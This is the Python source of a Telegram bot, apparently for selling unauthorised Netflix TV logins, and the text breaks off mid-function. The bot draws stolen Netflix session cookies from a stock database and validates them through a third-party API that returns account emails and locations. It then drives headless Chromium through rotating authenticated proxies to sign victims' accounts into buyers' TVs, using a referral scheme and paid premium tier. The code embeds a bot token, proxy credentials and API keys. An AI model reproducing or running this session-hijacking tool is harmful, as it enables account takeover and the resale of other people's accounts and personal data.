import re
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
import sqlite3
import threading
import asyncio
import tempfile
import os
import logging
import time
import hashlib
import subprocess
import zipfile
import shutil
import rarfile
from queue import Queue
from concurrent.futures import ThreadPoolExecutor
from playwright.async_api import async_playwright

# Set rarfile to not require unrar tool if possible, though rarfile usually needs it.
# We will use a more robust way to handle this.
logging.basicConfig(level=logging.ERROR)
logger = logging.getLogger(__name__)

# ══════════════════════════════════════════════
#  CONFIGURATION
# ══════════════════════════════════════════════
TELEGRAM_BOT_TOKEN = "8780198642:AAEKVKHLMiTQoP9ivsmS-IdyKFJB2Favb8Y"

STOCK_CHANNEL_ID  = int(os.environ.get("STOCK_CHANNEL_ID",  "-1003755778558"))
PUBLIC_CHANNEL_ID = int(os.environ.get("PUBLIC_CHANNEL_ID", "-1003870302189"))
ADMIN_IDS         = {int(x) for x in os.environ.get("ADMIN_IDS", "2077116559").split(",")}
SUPPORT_USERNAME  = os.environ.get("SUPPORT_USERNAME", "@netflixgiveawayx")

# ── Approval Group ──
APPROVAL_GROUP_ID = -5159971783

DB_PATH  = os.environ.get("DB_PATH", "nftv.db")
HEADLESS = True

# Premium purchase
PREMIUM_COST_RS = 30
UPI_ID          = os.environ.get("UPI_ID", "vaibhavzawdx@fam")

# Rate limits
NORMAL_DAILY_LIMIT  = 3
PREMIUM_DAILY_LIMIT = 5

# TV Activation
TV_URL         = "https://www.netflix.com/tv9"
CODE_SELECTOR  = "input[data-uia='input-text-with-label']"
CODE_FALLBACKS = [
    "input[autocomplete='one-time-code']", "input[name='code']",
    "input[maxlength='8']", "input[maxlength='1']",
    "input[type='tel']", "input[type='text']",
    "[data-uia='pin-input-field'] input", ".pin-input input",
]
SUBMIT_SELECTOR  = "button[data-uia='sign-in-form-submit-btn']"
SUBMIT_FALLBACKS = [
    "button[type='submit']", "button[data-uia='action-btn']",
    "[data-uia='login-submit-button']", "button:has-text('Continue')",
    "button:has-text('Next')",
]
DESKTOP_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)

# ══════════════════════════════════════════════
#  STATE & PERFORMANCE
# ══════════════════════════════════════════════
_pending_tv: dict  = {}   # uid -> {cookie}
_pending_utr: dict = {}   # uid -> {step, utr}
_executor = ThreadPoolExecutor(max_workers=20) # More workers for better concurrency

_http = requests.Session()
_adp  = requests.adapters.HTTPAdapter(pool_connections=50, pool_maxsize=100, max_retries=1)
_http.mount("https://", _adp)
_http.mount("http://",  _adp)

# Cache for some DB values to speed up button responses
_premium_cache = {} # uid -> (timestamp, status)
_must_join_cache = None

# ══════════════════════════════════════════════
#  PROXY ROTATION
# ══════════════════════════════════════════════
_RAW_PROXIES = [
    "31.59.20.176:6754:sunyxylf:jcpmdb5nd5tu",
    "23.95.150.145:6114:sunyxylf:jcpmdb5nd5tu",
    "198.23.239.134:6540:sunyxylf:jcpmdb5nd5tu",
    "45.38.107.97:6014:sunyxylf:jcpmdb5nd5tu",
    "107.172.163.27:6543:sunyxylf:jcpmdb5nd5tu",
    "198.105.121.200:6462:sunyxylf:jcpmdb5nd5tu",
    "216.10.27.159:6837:sunyxylf:jcpmdb5nd5tu",
    "142.111.67.146:5611:sunyxylf:jcpmdb5nd5tu",
    "191.96.254.138:6185:sunyxylf:jcpmdb5nd5tu",
    "31.58.9.4:6077:sunyxylf:jcpmdb5nd5tu",
]

def _pp(raw):
    try:
        ip, port, u, pw = raw.strip().split(":")
        return {"server": f"http://{ip}:{port}", "username": u, "password": pw}
    except:
        return None

_PROXY_LIST  = [p for r in _RAW_PROXIES if (p := _pp(r))]
_proxy_lock  = threading.Lock()
_proxy_idx   = 0
_dead_proxies: set = set()

def _next_proxy():
    global _proxy_idx
    with _proxy_lock:
        n = len(_PROXY_LIST)
        if n == 0: return None
        for _ in range(n):
            p = _PROXY_LIST[_proxy_idx % n]
            _proxy_idx = (_proxy_idx + 1) % n
            if p["server"] not in _dead_proxies:
                return p
    return None

def _kill_proxy(p):
    if p:
        _dead_proxies.add(p["server"])

# ══════════════════════════════════════════════
#  DATABASE
# ══════════════════════════════════════════════
_db_pool = Queue(maxsize=20)

def _mkconn():
    c = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=20)
    c.execute("PRAGMA journal_mode=WAL")
    c.execute("PRAGMA synchronous=OFF") # Performance boost
    c.execute("PRAGMA cache_size=-64000") # Larger cache
    c.execute("PRAGMA temp_store=MEMORY")
    c.execute("PRAGMA foreign_keys=ON")
    return c

class _DB:
    def __enter__(self):
        try:
            self.c = _db_pool.get(timeout=5)
        except:
            self.c = _mkconn()
        return self.c
    def __exit__(self, *_):
        try:
            _db_pool.put_nowait(self.c)
        except:
            self.c.close()

def db():
    return _DB()

def init_db():
    for _ in range(15):
        _db_pool.put(_mkconn())
    with db() as c:
        c.executescript("""
            CREATE TABLE IF NOT EXISTS users(
                uid INTEGER PRIMARY KEY,
                joined INTEGER NOT NULL DEFAULT 0,
                is_premium INTEGER NOT NULL DEFAULT 0,
                premium_until INTEGER NOT NULL DEFAULT 0
            );
            CREATE TABLE IF NOT EXISTS referrals(
                referrer_uid INTEGER NOT NULL,
                referred_uid INTEGER NOT NULL,
                PRIMARY KEY(referrer_uid, referred_uid)
            );
            CREATE TABLE IF NOT EXISTS pending_refs(
                new_uid INTEGER PRIMARY KEY,
                referrer_uid INTEGER NOT NULL
            );
            CREATE TABLE IF NOT EXISTS stock(
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                cookie TEXT NOT NULL,
                msg_id INTEGER DEFAULT NULL
            );
            CREATE TABLE IF NOT EXISTS used_cookies(
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                cookie TEXT NOT NULL
            );
            CREATE TABLE IF NOT EXISTS used_remote_cookies(
                cookie_hash TEXT PRIMARY KEY,
                cookie_preview TEXT NOT NULL,
                used_at INTEGER NOT NULL DEFAULT (strftime('%s','now'))
            );
            CREATE TABLE IF NOT EXISTS daily_usage(
                uid INTEGER NOT NULL,
                date TEXT NOT NULL,
                count INTEGER NOT NULL DEFAULT 0,
                PRIMARY KEY(uid, date)
            );
            CREATE TABLE IF NOT EXISTS pending_payments(
                uid INTEGER PRIMARY KEY,
                utr TEXT NOT NULL,
                created_at INTEGER NOT NULL DEFAULT (strftime('%s','now'))
            );
            CREATE TABLE IF NOT EXISTS must_join_channels(
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                channel_id TEXT NOT NULL UNIQUE,
                channel_name TEXT NOT NULL,
                invite_link TEXT NOT NULL
            );
            CREATE TABLE IF NOT EXISTS _meta(key TEXT PRIMARY KEY, value TEXT);
        """)
        c.execute("INSERT OR REPLACE INTO _meta(key,value)VALUES('schema_version','2')")
        c.commit()
    print("[DB] Ready (schema v2)")

# ══════════════════════════════════════════════
#  DB HELPERS
# ══════════════════════════════════════════════

def _eu(uid):
    with db() as c:
        c.execute("INSERT OR IGNORE INTO users(uid)VALUES(?)", (uid,))
        c.commit()

def is_premium(uid):
    # Check cache first
    now = time.time()
    if uid in _premium_cache:
        ts, status = _premium_cache[uid]
        if now - ts < 60: # 1 minute cache
            return status

    _eu(uid)
    with db() as c:
        r = c.execute("SELECT is_premium, premium_until FROM users WHERE uid=?", (uid,)).fetchone()
    
    status = False
    if r:
        if r[0] and (r[1] == 0 or r[1] > int(time.time())):
            status = True
        elif r[0]:
            with db() as c:
                c.execute("UPDATE users SET is_premium=0 WHERE uid=?", (uid,))
                c.commit()
    
    _premium_cache[uid] = (now, status)
    return status

def grant_premium(uid, days=30):
    _eu(uid)
    until = int(time.time()) + days * 86400
    with db() as c:
        c.execute("UPDATE users SET is_premium=1, premium_until=? WHERE uid=?", (until, uid))
        c.commit()
    _premium_cache.pop(uid, None) # Invalidate cache

def get_refs(uid):
    with db() as c:
        return (c.execute("SELECT COUNT(*) FROM referrals WHERE referrer_uid=?", (uid,)).fetchone() or (0,))[0]

def add_referral(ref, new):
    try:
        with db() as c:
            c.execute("INSERT INTO referrals(referrer_uid,referred_uid)VALUES(?,?)", (ref, new))
            c.commit()
        return True
    except sqlite3.IntegrityError:
        return False

def mark_joined(uid):
    _eu(uid)
    with db() as c:
        c.execute("UPDATE users SET joined=1 WHERE uid=?", (uid,))
        c.commit()

def has_joined(uid):
    _eu(uid)
    with db() as c:
        r = c.execute("SELECT joined FROM users WHERE uid=?", (uid,)).fetchone()
    return bool(r and r[0])

def set_pending(new, ref):
    with db() as c:
        c.execute("INSERT OR REPLACE INTO pending_refs(new_uid,referrer_uid)VALUES(?,?)", (new, ref))
        c.commit()

def pop_pending(new):
    with db() as c:
        r = c.execute("SELECT referrer_uid FROM pending_refs WHERE new_uid=?", (new,)).fetchone()
        if r:
            c.execute("DELETE FROM pending_refs WHERE new_uid=?", (new,))
            c.commit()
            return r[0]
    return None

# ── Rate limit ────────────────────────────────
def get_today():
    return time.strftime("%Y-%m-%d", time.gmtime())

def get_daily_usage(uid):
    today = get_today()
    with db() as c:
        r = c.execute("SELECT count FROM daily_usage WHERE uid=? AND date=?", (uid, today)).fetchone()
    return r[0] if r else 0

def increment_daily_usage(uid):
    today = get_today()
    with db() as c:
        c.execute("""
            INSERT INTO daily_usage(uid, date, count) VALUES(?,?,1)
            ON CONFLICT(uid,date) DO UPDATE SET count=count+1
        """, (uid, today))
        c.commit()

def check_rate_limit(uid):
    used  = get_daily_usage(uid)
    limit = PREMIUM_DAILY_LIMIT if is_premium(uid) else NORMAL_DAILY_LIMIT
    return used < limit, used, limit

def get_visual_bar(used, limit):
    filled_len = int((used / limit) * 10)
    bar = "▓" * filled_len + "░" * (10 - filled_len)
    return bar

# ── Must-join channels ────────────────────────
def get_must_join_channels():
    global _must_join_cache
    if _must_join_cache is not None:
        return _must_join_cache
    
    with db() as c:
        rows = c.execute("SELECT channel_id, channel_name, invite_link FROM must_join_channels").fetchall()
    _must_join_cache = [{"id": r[0], "name": r[1], "link": r[2]} for r in rows]
    return _must_join_cache

def add_must_join_channel(channel_id: str, channel_name: str, invite_link: str):
    global _must_join_cache
    with db() as c:
        c.execute(
            "INSERT OR REPLACE INTO must_join_channels(channel_id, channel_name, invite_link) VALUES(?,?,?)",
            (channel_id, channel_name, invite_link),
        )
        c.commit()
    _must_join_cache = None # Invalidate cache

def remove_must_join_channel(channel_id: str):
    global _must_join_cache
    with db() as c:
        deleted = c.execute("DELETE FROM must_join_channels WHERE channel_id=?", (channel_id,)).rowcount
        c.commit()
    _must_join_cache = None # Invalidate cache
    return deleted > 0

def build_must_join_kb(channels, uid):
    kb = InlineKeyboardMarkup()
    for ch in channels:
        kb.row(InlineKeyboardButton(f"📢 {ch['name']}", url=ch["link"]))
    kb.row(InlineKeyboardButton("✅  I've Joined — Verify", callback_data=f"verify_join:{uid}"))
    return kb

# ── Cookie helpers ────────────────────────────
def stock_count():
    with db() as c:
        local = (c.execute("SELECT COUNT(*) FROM stock").fetchone() or (0,))[0]
    return local

def pop_cookie():
    with db() as c:
        r = c.execute("SELECT id,cookie,msg_id FROM stock ORDER BY id LIMIT 1").fetchone()
        if not r:
            return None
        sid, cookie, mid = r
        c.execute("DELETE FROM stock WHERE id=?", (sid,))
        c.execute("INSERT INTO used_cookies(cookie)VALUES(?)", (cookie,))
        c.commit()
    if mid:
        try:
            bot.delete_message(STOCK_CHANNEL_ID, mid)
        except:
            pass
    return cookie

def push_cookie(cookie, msg_id=None):
    with db() as c:
        c.execute("INSERT INTO stock(cookie,msg_id)VALUES(?,?)", (cookie.strip(), msg_id))
        c.commit()

def push_cookies_bulk(cookies):
    if not cookies: return
    with db() as c:
        c.executemany("INSERT INTO stock(cookie) VALUES (?)", [(ck.strip(),) for ck in cookies])
        c.commit()

def kill_cookie(cookie):
    with db() as c:
        c.execute("INSERT INTO used_cookies(cookie)VALUES(?)", (cookie,))
        c.commit()

def _is_cookie(text):
    t = text.lower()
    return (
        "netflix" in t
        or "netflixid" in t.replace(" ", "")
        or "securenetflixid" in t.replace(" ", "")
        or (text.strip().startswith("[") and "netflix" in t)
    )

def _parse_cookies(text):
    cookies = []
    if text.strip().startswith("["):
        import json
        try:
            cookies = json.loads(text)
            return cookies
        except:
            pass
    
    for line in text.strip().split(";"):
        line = line.strip()
        if "=" in line:
            k, v = line.split("=", 1)
            cookies.append({"name": k.strip(), "value": v.strip(), "domain": ".netflix.com"})
    return cookies

# ── Payment helpers ───────────────────────────
def save_pending_payment(uid, utr):
    with db() as c:
        c.execute("INSERT OR REPLACE INTO pending_payments(uid, utr) VALUES(?,?)", (uid, utr))
        c.commit()

def get_pending_payment(uid):
    with db() as c:
        r = c.execute("SELECT utr FROM pending_payments WHERE uid=?", (uid,)).fetchone()
    return r[0] if r else None

def clear_pending_payment(uid):
    with db() as c:
        c.execute("DELETE FROM pending_payments WHERE uid=?", (uid,))
        c.commit()

# ══════════════════════════════════════════════
#  TV ACTIVATION (Playwright)
# ══════════════════════════════════════════════

def _extract_nftoken(text):
    match = re.search(r'https://netflix\.com/\?nftoken=([a-zA-Z0-9+/=]+)', text)
    if match:
        return match.group(0)
    return None

async def verify_cookie_api(cookie_raw, proxy=None):
    url = "https://nftoken.site/v1/api.php"
    # Rotate between the two provided API keys
    api_keys = ["NFK_00b4861d806da4a23c1aca87", "NFK_776804a0a5aeb882cabf596e"]
    import random
    selected_key = random.choice(api_keys)
    
    payload = {
        "key": selected_key,
        "cookie": cookie_raw
    }
    
    # We will NOT use proxy for the API call itself to avoid 407 errors
    # The API doesn't need proxies and is much faster directly
    async def _do_post():
        loop = asyncio.get_event_loop()
        # Direct POST without proxies
        return await loop.run_in_executor(None, lambda: requests.post(url, json=payload, timeout=20))

    try:
        response = await _do_post()
        data = response.json()
        
        if data.get("status") == "SUCCESS":
            pc_link = data.get("x_l1")
            details = {
                "Account Email": data.get("x_mail", "N/A"),
                "Renew Cycle": data.get("x_ren", "N/A"),
                "Location": data.get("x_loc", "N/A"),
                "Profiles": [p.strip() for p in data.get("x_usr", "").split(",") if p.strip()]
            }
            return pc_link, details
        return None, None
    except Exception as e:
        logger.error(f"API Final Error: {e}")
        return None, None

async def _tv_async_new(cookie_raw, code, proxy):
    # Step 1: Verify via API and get PC Link
    pc_link, details = await verify_cookie_api(cookie_raw, proxy)
    if not pc_link:
        return False, None, "Dead Cookie"
    
    sc = tempfile.NamedTemporaryFile(suffix=".png", delete=False).name
    kw = {
        "headless": HEADLESS,
        "args": ["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"],
    }
    if proxy:
        kw["proxy"] = proxy
        
    async with async_playwright() as pw:
        br = await pw.chromium.launch(**kw)
        ctx = await br.new_context(viewport={"width": 1280, "height": 800}, user_agent=DESKTOP_UA)
        pg = await ctx.new_page()
        try:
            # Step 2: Login via PC Link
            await pg.goto(pc_link, wait_until="networkidle", timeout=45000)
            
            # Step 3: Go to TV9
            await pg.goto(TV_URL, wait_until="domcontentloaded", timeout=30000)
            
            matched = None
            for sel in [CODE_SELECTOR] + CODE_FALLBACKS:
                try:
                    await pg.wait_for_selector(sel, state="visible", timeout=5000)
                    matched = sel
                    break
                except:
                    continue
            
            if not matched:
                await pg.screenshot(path=sc)
                return False, sc, details
            
            inputs = await pg.query_selector_all(matched)
            if len(inputs) > 1:
                for i, d in enumerate(code):
                    if i < len(inputs):
                        await inputs[i].fill(d)
                        await pg.wait_for_timeout(80)
            else:
                await pg.fill(matched, code)
            
            done = False
            for sel in [SUBMIT_SELECTOR] + SUBMIT_FALLBACKS:
                try:
                    await pg.wait_for_selector(sel, state="visible", timeout=4000)
                    await pg.click(sel)
                    done = True
                    break
                except:
                    continue
            if not done:
                await pg.press(matched, "Enter")
                
            await asyncio.sleep(5)
            await pg.screenshot(path=sc)
            return True, sc, details
        except Exception as e:
            logger.error(f"TV Async Error: {e}")
            return False, None, details
        finally:
            await br.close()

def tv_activate_new(cookie_raw, code, proxy):
    loop = asyncio.new_event_loop()
    try:
        return loop.run_until_complete(_tv_async_new(cookie_raw, code, proxy))
    finally:
        loop.close()

async def _tv_async(cookie_raw, code, proxy):
    cookies = _parse_cookies(cookie_raw)
    sc = tempfile.NamedTemporaryFile(suffix=".png", delete=False).name
    kw = {
        "headless": HEADLESS,
        "args": ["--no-sandbox", "--disable-dev-shm-usage",
                 "--disable-gpu", "--disable-extensions", "--no-first-run"],
    }
    if proxy:
        kw["proxy"] = proxy
    async with async_playwright() as pw:
        br  = await pw.chromium.launch(**kw)
        ctx = await br.new_context(
            viewport={"width": 1280, "height": 800},
            user_agent=DESKTOP_UA,
            ignore_https_errors=True,
        )
        await ctx.route(
            "**/*.{png,jpg,jpeg,gif,svg,ico,woff,woff2,ttf,mp4,webm}",
            lambda r: r.abort(),
        )
        pg = await ctx.new_page()
        try:
            await ctx.add_cookies(cookies)
            await pg.goto(TV_URL, wait_until="domcontentloaded", timeout=30000)
            matched = None
            for sel in [CODE_SELECTOR] + CODE_FALLBACKS:
                try:
                    await pg.wait_for_selector(sel, state="visible", timeout=5000)
                    matched = sel
                    break
                except:
                    continue
            if not matched:
                await pg.screenshot(path=sc, full_page=False)
                return False, sc
            inputs = await pg.query_selector_all(matched)
            if len(inputs) > 1:
                for i, d in enumerate(code):
                    if i < len(inputs):
                        await inputs[i].click()
                        await inputs[i].fill(d)
                        await pg.wait_for_timeout(80)
            else:
                await pg.fill(matched, "")
                await pg.type(matched, code, delay=60)
            done = False
            for sel in [SUBMIT_SELECTOR] + SUBMIT_FALLBACKS:
                try:
                    await pg.wait_for_selector(sel, state="visible", timeout=4000)
                    await pg.click(sel)
                    done = True
                    break
                except:
                    continue
            if not done:
                await pg.press(matched, "Enter")
            try:
                await pg.wait_for_load_state("domcontentloaded", timeout=12000)
            except:
                pass
            await pg.screenshot(path=sc, full_page=False)
            return True, sc
        finally:
            await ctx.close()
            await br.close()

def tv_activate(cookie_raw, code, proxy):
    loop = asyncio.new_event_loop()
    try:
        return loop.run_until_complete(_tv_async(cookie_raw, code, proxy))
    finally:
        loop.close()

def run_bg(fn, *args, **kwargs):
    return _executor.submit(fn, *args, **kwargs)

# ══════════════════════════════════════════════
#  BOT SETUP
# ══════════════════════════════════════════════
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, num_threads=32) # More threads for bot
PINNED_MSG = {}

_FATAL_ERRORS = (
    "bot was blocked", "user is deactivated", "chat not found",
    "not enough rights", "bot is not a member", "have no rights",
    "forbidden", "kicked", "deactivated",
)

def _is_fatal(e):
    return any(x in str(e).lower() for x in _FATAL_ERRORS)

def safe_send(fn, *args, **kwargs):
    try:
        return fn(*args, **kwargs)
    except Exception as e:
        if not _is_fatal(e):
            logger.warning(f"[SEND_ERR] {e}")
        return None

def safe_msg(chat_id, text, **kw):
    return safe_send(bot.send_message, chat_id, text, **kw)

def safe_edit(text, chat_id, msg_id, **kw):
    try:
        return bot.edit_message_text(text, chat_id, msg_id, **kw)
    except:
        return None

def update_pin():
    n   = stock_count()
    txt = (
        f"📺 *Netflix TV Activation Bot*\n{'━'*18}\n"
        f"✅ Stock: `{n}` account{'s' if n != 1 else ''}\n"
        f"{'━'*18}\n▶️ /start"
    )
    mid = PINNED_MSG.get(PUBLIC_CHANNEL_ID)
    try:
        if mid:
            bot.edit_message_text(txt, PUBLIC_CHANNEL_ID, mid, parse_mode="Markdown")
        else:
            m = bot.send_message(PUBLIC_CHANNEL_ID, txt, parse_mode="Markdown")
            bot.pin_chat_message(PUBLIC_CHANNEL_ID, m.message_id, disable_notification=True)
            PINNED_MSG[PUBLIC_CHANNEL_ID] = m.message_id
    except:
        pass

_bot_info_cache = None
def get_bot_info():
    global _bot_info_cache
    if not _bot_info_cache:
        _bot_info_cache = bot.get_me()
    return _bot_info_cache

# ══════════════════════════════════════════════
#  MENU BUILDERS
# ══════════════════════════════════════════════
def _limit_info(uid):
    used  = get_daily_usage(uid)
    limit = PREMIUM_DAILY_LIMIT if is_premium(uid) else NORMAL_DAILY_LIMIT
    return used, limit

def menu_text(uid):
    try:
        u    = bot.get_chat(uid)
        name = u.first_name or u.username or str(uid)
    except:
        name = str(uid)
    refs      = get_refs(uid)
    used, lim = _limit_info(uid)
    link      = f"https://t.me/{get_bot_info().username}?start=ref_{uid}"
    
    premium = is_premium(uid)
    tier = "👑 *PREMIUM*" if premium else "🆓 Free"
    bar = get_visual_bar(used, lim)
    
    premium_msg = ""
    if premium:
        premium_msg = "✅ *You already have Premium!*"
    
    return (
        f"📺 *NETFLIX TV LOGIN BOT*\n"
        f"{'━'*28}\n\n"
        f"👤 `{name}`\n"
        f"🏷 Tier: {tier}\n"
        f"🤝 Referrals: `{refs}`\n\n"
        f"📊 Today: {bar} `{used}/{lim}`\n"
        f"🔗 Invite: `{link}`\n"
        f"{'━'*28}\n"
        f"{premium_msg}\n"
        f"_1 referral = 1 free TV login_"
    )

def menu_kb(uid):
    kb = InlineKeyboardMarkup()
    kb.row(InlineKeyboardButton("📺  TV Login", callback_data=f"tv_login:{uid}"))
    
    if not is_premium(uid):
        kb.row(
            InlineKeyboardButton("👑  Buy Premium  ₹30", callback_data=f"buy_premium:{uid}"),
            InlineKeyboardButton("🤝  Invite",            callback_data=f"invite:{uid}"),
        )
    else:
        kb.row(
            InlineKeyboardButton("🤝  Invite",            callback_data=f"invite:{uid}"),
        )
        
    kb.row(InlineKeyboardButton("🆘  Support", url=f"https://t.me/{SUPPORT_USERNAME.lstrip('@')}"))
    return kb

def award_ref(uid, ref_id):
    if ref_id and ref_id != uid:
        if add_referral(ref_id, uid):
            safe_msg(
                ref_id,
                f"🎉 *Friend joined!*\n\n"
                f"You earned *+1 free TV login* 📺\n"
                f"{'━'*24}\n"
                f"🤝 Total referrals: `{get_refs(ref_id)}`",
                parse_mode="Markdown",
            )

# ══════════════════════════════════════════════
#  MUST-JOIN CHECK
# ══════════════════════════════════════════════
def check_must_join(uid):
    if is_premium(uid):
        return []
    channels = get_must_join_channels()
    not_joined = []
    for ch in channels:
        try:
            member = bot.get_chat_member(ch["id"], uid)
            if member.status in ("left", "kicked", "banned"):
                not_joined.append(ch)
        except:
            not_joined.append(ch)
    return not_joined

# ══════════════════════════════════════════════
#  HANDLERS
# ══════════════════════════════════════════════

def check_group_restriction(msg):
    if msg.chat.type != "private" and msg.from_user.id not in ADMIN_IDS:
        bot.reply_to(msg, f"❌ This bot can only be used in DMs.")
        return False
    return True

@bot.message_handler(commands=["start"])
def cmd_start(msg):
    if not check_group_restriction(msg): return
    uid   = msg.from_user.id
    parts = msg.text.strip().split()
    ref   = None
    if len(parts) > 1 and parts[1].startswith("ref_"):
        try:
            ref = int(parts[1].split("_")[1])
            if ref == uid:
                ref = None
        except:
            pass
    _eu(uid)
    if not has_joined(uid):
        mark_joined(uid)
        award_ref(uid, pop_pending(uid) or ref)
    elif ref:
        set_pending(uid, ref)
    safe_msg(msg.chat.id, menu_text(uid), parse_mode="Markdown", reply_markup=menu_kb(uid))


# ── TV Login ──────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data.startswith("tv_login:"))
def cb_tv_login(call):
    uid = call.from_user.id
    bot.answer_callback_query(call.id, "")

    not_joined = check_must_join(uid)
    if not_joined:
        kb = build_must_join_kb(not_joined, uid)
        try:
            bot.edit_message_text(
                f"📢 *Join required!*\n{'━'*28}\n\n"
                f"Please join the channel{'s' if len(not_joined) > 1 else ''} below to use the bot:\n\n"
                + "\n".join(f"• [{ch['name']}]({ch['link']})" for ch in not_joined) +
                f"\n\n_Tap the button below after joining._",
                call.message.chat.id, call.message.message_id,
                parse_mode="Markdown",
                reply_markup=kb,
            )
        except:
            pass
        return

    can, used, limit = check_rate_limit(uid)
    if not can:
        hint = "" if is_premium(uid) else "\n\n👑 Upgrade to *Premium* for 5 logins/day!"
        try:
            bot.edit_message_text(
                f"⏳ *Daily limit reached*\n{'━'*28}\n\n"
                f"📊 Used: `{used}/{limit}` today\n"
                f"🔄 Resets at midnight UTC{hint}",
                call.message.chat.id, call.message.message_id,
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup().row(
                    InlineKeyboardButton("🔙 Back", callback_data=f"back_menu:{uid}")
                ),
            )
        except:
            pass
        return

    if not is_premium(uid) and get_refs(uid) <= 0:
        try:
            bot.edit_message_text(
                f"❌ *No credits*\n{'━'*28}\n\n"
                f"You need *1 referral* to get a free TV login.\n\n"
                f"🔗 Share your link:\n"
                f"`https://t.me/{get_bot_info().username}?start=ref_{uid}`\n\n"
                f"👑 Or buy *Premium* for 5 logins/day!",
                call.message.chat.id, call.message.message_id,
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup().row(
                    InlineKeyboardButton("👑 Buy Premium", callback_data=f"buy_premium:{uid}"),
                    InlineKeyboardButton("🔙 Back",        callback_data=f"back_menu:{uid}"),
                ),
            )
        except:
            pass
        return

    if stock_count() == 0:
        try:
            bot.edit_message_text(
                f"😔 *Out of stock*\n{'━'*28}\n\nNo accounts available right now. Check back soon!",
                call.message.chat.id, call.message.message_id,
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup().row(
                    InlineKeyboardButton("🔙 Back", callback_data=f"back_menu:{uid}")
                ),
            )
        except:
            pass
        return

    cookie = pop_cookie()
    if not cookie:
        safe_msg(call.message.chat.id, "😔 Stock just ran out. Try again later.")
        return

    increment_daily_usage(uid)
    update_pin()
    _pending_tv[uid] = {"cookie": cookie}

    try:
        bot.edit_message_text(
            f"📺 *TV Login — Enter Code*\n{'━'*28}\n\n"
            f"📊 Usage today: `{used+1}/{limit}`\n\n"
            f"📟 Send the *8-digit code* shown on your Netflix TV screen:\n\n"
            f"_Example: `67892012`_",
            call.message.chat.id, call.message.message_id,
            parse_mode="Markdown",
        )
    except:
        pass


@bot.callback_query_handler(func=lambda c: c.data.startswith("verify_join:"))
def cb_verify_join(call):
    uid = call.from_user.id
    not_joined = check_must_join(uid)
    if not not_joined:
        bot.answer_callback_query(call.id, "✅ Verified!")
        try:
            bot.edit_message_text(menu_text(uid), call.message.chat.id, call.message.message_id,
                                  parse_mode="Markdown", reply_markup=menu_kb(uid))
        except:
            pass
    else:
        bot.answer_callback_query(call.id, f"❌ You still haven't joined {len(not_joined)} channel(s).", show_alert=True)


import io
import numpy as np
try:
    import cv2
    HAS_QR = True
except ImportError:
    HAS_QR = False

def scan_qr(image_bytes):
    if not HAS_QR:
        return None
    try:
        # Convert bytes to numpy array
        nparr = np.frombuffer(image_bytes, np.uint8)
        # Decode image
        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        if img is None:
            return None
            
        # Initialize QR Code detector
        detector = cv2.QRCodeDetector()
        # Detect and decode
        val, pts, st_code = detector.detectAndDecode(img)
        
        if val and "netflix.com" in val:
            return val
            
        # Fallback for some complex QR codes using WeChat QR detector if available
        # or just standard detection. Standard OpenCV detector is usually enough.
    except Exception as e:
        logger.error(f"QR Scan Error: {e}")
    return None

async def _tv_async_qr(cookie_raw, qr_url, proxy):
    # Step 1: Verify via API and get PC Link
    pc_link, details = await verify_cookie_api(cookie_raw, proxy)
    if not pc_link:
        return False, None, "Dead Cookie"
    
    sc = tempfile.NamedTemporaryFile(suffix=".png", delete=False).name
    kw = {
        "headless": HEADLESS,
        "args": ["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"],
    }
    if proxy:
        kw["proxy"] = proxy
        
    async with async_playwright() as pw:
        br = await pw.chromium.launch(**kw)
        ctx = await br.new_context(viewport={"width": 1280, "height": 800}, user_agent=DESKTOP_UA)
        pg = await ctx.new_page()
        try:
            # Step 2: Login via PC Link
            await pg.goto(pc_link, wait_until="networkidle", timeout=45000)
            
            # Step 3: Go to the QR URL (Direct activation link)
            await pg.goto(qr_url, wait_until="networkidle", timeout=30000)
            
            # Usually these links have an "Allow" or "Approve" button
            try:
                # Common selectors for activation approval
                for btn_sel in ["button.btn-primary", "button:has-text('Allow')", "button:has-text('Approve')", "button:has-text('Yes')"]:
                    btn = await pg.query_selector(btn_sel)
                    if btn:
                        await btn.click()
                        await asyncio.sleep(3)
                        break
            except:
                pass
                
            await asyncio.sleep(5)
            await pg.screenshot(path=sc)
            return True, sc, details
        except Exception as e:
            logger.error(f"QR Async Error: {e}")
            return False, None, details
        finally:
            await br.close()

def tv_activate_qr(cookie_raw, qr_url, proxy):
    loop = asyncio.new_event_loop()
    try:
        return loop.run_until_complete(_tv_async_qr(cookie_raw, qr_url, proxy))
    finally:
        loop.close()

def _do_tv_qr_activate(uid, cookie, qr_url, chat_ref, smsg):
    chat_id = chat_ref.chat.id if hasattr(chat_ref, "chat") else chat_ref
    lim     = PREMIUM_DAILY_LIMIT if is_premium(uid) else NORMAL_DAILY_LIMIT

    def run():
        current_cookie = cookie
        for attempt in range(1, 11):
            proxy = _next_proxy()
            try:
                safe_edit(f"⏳ *Processing QR Activation {attempt}/10...*", chat_id, smsg.message_id, parse_mode="Markdown")
                ok, sc, details = tv_activate_qr(current_cookie, qr_url, proxy)
                
                if ok:
                    increment_daily_usage(uid)
                    acc_info = f"✅ *QR Activation Success!*\\n{'━'*24}\\n"
                    if isinstance(details, dict):
                        acc_info += f"📧 Email: `{details.get('Account Email', 'N/A')}`\\n"
                        acc_info += f"📅 Renew: `{details.get('Renew Cycle', 'N/A')}`\\n"
                    acc_info += f"📊 Usage today: `{get_daily_usage(uid)}/{lim}`"
                    
                    try: bot.delete_message(chat_id, smsg.message_id)
                    except: pass
                        
                    with open(sc, "rb") as f:
                        safe_send(bot.send_photo, chat_id, f, caption=acc_info, parse_mode="Markdown", reply_markup=menu_kb(uid))
                    return
                else:
                    kill_cookie(current_cookie)
                    if attempt < 10:
                        current_cookie = pop_cookie()
                        if not current_cookie: break
                    continue
